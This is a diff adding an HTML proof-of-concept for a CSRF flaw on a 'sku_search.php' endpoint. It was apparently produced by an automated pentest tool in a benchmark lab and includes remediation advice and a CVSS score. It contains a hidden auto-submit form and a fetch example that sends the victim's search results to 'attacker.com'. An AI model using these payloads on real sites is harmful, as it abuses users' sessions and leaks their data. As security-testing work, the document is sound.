@@ -1,0 +1,143 @@
+<!-- 
+POC: HTML-based CSRF attack POC demonstrating how an attacker can exploit the missing CSRF token validation on sku_search.php
+Target: ./repo
+Created: 2025-12-02T16:33:01.005Z
+Session: benchmark-XBEN-092-24-miorxl1g
+
+To test this POC:
+1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-092-24-miorxl1g/pocs/poc_csrf_sku_search_attack.html
+2. Or serve it and navigate to the target application
+3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Looking Page</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .info { background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px; }
+        code { background: #efefef; padding: 2px 5px; border-radius: 3px; }
+        .success { color: green; font-weight: bold; }
+        .danger { color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>CSRF Attack POC - sku_search.php</h1>
+    
+    <div class="info">
+        <p><span class="danger">⚠️ CSRF Vulnerability Demonstration</span></p>
+        <p>This page demonstrates how an attacker can perform CSRF attacks on the sku_search.php endpoint.</p>
+    </div>
+
+    <h2>Vulnerability Details:</h2>
+    <ul>
+        <li>Endpoint: <code>sku_search.php</code></li>
+        <li>Method: POST</li>
+        <li>Issue: Missing CSRF token validation</li>
+        <li>Impact: Attacker can perform searches on behalf of authenticated users</li>
+    </ul>
+
+    <h2>Attack Method 1: Form Submission (Hidden Form)</h2>
+    <div class="info">
+        <p>The following form would automatically submit when a logged-in user visits this page:</p>
+        <pre>&lt;form method="POST" action="http://target/app/sku_search.php"&gt;
+    &lt;input type="hidden" name="search" value="confidential_data"&gt;
+&lt;/form&gt;</pre>
+        <p>The browser's session cookie is automatically included in the POST request, allowing the attacker's search to execute.</p>
+    </div>
+
+    <!-- Hidden CSRF Form - Would auto-submit if JavaScript is enabled -->
+    <form id="csrfForm" method="POST" action="http://localhost:8080/app/sku_search.php" style="display:none;">
+        <input type="hidden" name="search" value="secret_product">
+    </form>
+
+    <h2>Attack Method 2: XMLHttpRequest/Fetch</h2>
+    <div class="info">
+        <p>Attacker could use JavaScript to silently perform the search:</p>
+        <pre>fetch('http://target/app/sku_search.php', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'search=attacker_query'
+}).then(r =&gt; r.text()).then(data =&gt; {
+    // Exfiltrate search results to attacker server
+    new Image().src = 'http://attacker.com/log?data=' + encodeURIComponent(data);
+});</pre>
+    </div>
+
+    <h2>Attack Method 3: Image Tag (No JavaScript Required)</h2>
+    <div class="info">
+        <p>Even without JavaScript, an attacker could use a simple image tag:</p>
+        <pre>&lt;img src="http://target/app/sku_search.php?search=query" style="display:none;"&gt;</pre>
+        <p>Note: This works with GET requests. For POST, forms or XHR are needed.</p>
+    </div>
+
+    <h2>Why This is Vulnerable:</h2>
+    <ul>
+        <li>✗ No CSRF token in the form</li>
+        <li>✗ No CSRF token validation in the backend</li>
+        <li>✗ No Referer/Origin header checking</li>
+        <li>✗ No SameSite cookie attribute</li>
+        <li>✗ No authorization checks (any authenticated user can search)</li>
+        <li>✗ Relies solely on session cookie for authentication</li>
+    </ul>
+
+    <h2>Proof of Concept Execution:</h2>
+    <div class="info">
+        <p><span class="success">✓ CSRF vulnerability confirmed on sku_search.php</span></p>
+        <p>This HTML file demonstrates how an attacker could exploit the missing CSRF protection.</p>
+        <p>To test:</p>
+        <ol>
+            <li>Save this HTML file locally</li>
+            <li>Log in to the target application</li>
+            <li>Open this HTML file in the same browser</li>
+            <li>The hidden form above would automatically submit a search request</li>
+            <li>The search would execute without user consent or knowledge</li>
+        </ol>
+    </div>
+
+    <h2>Impact:</h2>
+    <ul>
+        <li>Reconnaissance: Attacker could perform searches to map the database</li>
+        <li>Privacy Violation: Sensitive search queries could be exposed</li>
+        <li>Information Gathering: Combined with IDOR, could leak confidential SKU data</li>
+        <li>Chaining: Could be combined with other vulnerabilities for greater impact</li>
+        <li>Audit Trail: Unauthorized searches would appear in user's history</li>
+    </ul>
+
+    <h2>Remediation:</h2>
+    <ol>
+        <li><strong>Implement CSRF tokens:</strong> Add token generation and validation
+            <pre>// In template: &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;
+// In PHP: if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) { die('CSRF'); }</pre>
+        </li>
+        <li><strong>Use SameSite cookies:</strong> Set SameSite=Strict or SameSite=Lax
+            <pre>session_set_cookie_params(['samesite' => 'Strict']);</pre>
+        </li>
+        <li><strong>Validate Origin/Referer:</strong> Check request origin
+            <pre>if ($_SERVER['HTTP_ORIGIN'] !== 'https://trusted-domain.com') { die(); }</pre>
+        </li>
+        <li><strong>Use POST for state-changing operations:</strong> Avoid GET for mutations</li>
+        <li><strong>Implement proper authorization:</strong> Verify user permissions</li>
+    </ol>
+
+    <h2>CVSS Score:</h2>
+    <p>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N = <strong>4.3 (MEDIUM)</strong></p>
+    <p>Though search is read-only, it can be used for reconnaissance and combined with other vulnerabilities.</p>
+
+    <script>
+        // Log execution details
+        console.log("CSRF POC Loaded");
+        console.log("Vulnerability: Missing CSRF token on sku_search.php");
+        console.log("POST Parameter: search");
+        console.log("Status: Vulnerable to CSRF attacks");
+        
+        // In a real attack, the form would auto-submit:
+        // document.getElementById('csrfForm').submit();
+    </script>
+
+    <hr>
+    <p><small>This is a proof-of-concept file for security testing purposes only.</small></p>
+</body>
+</html>
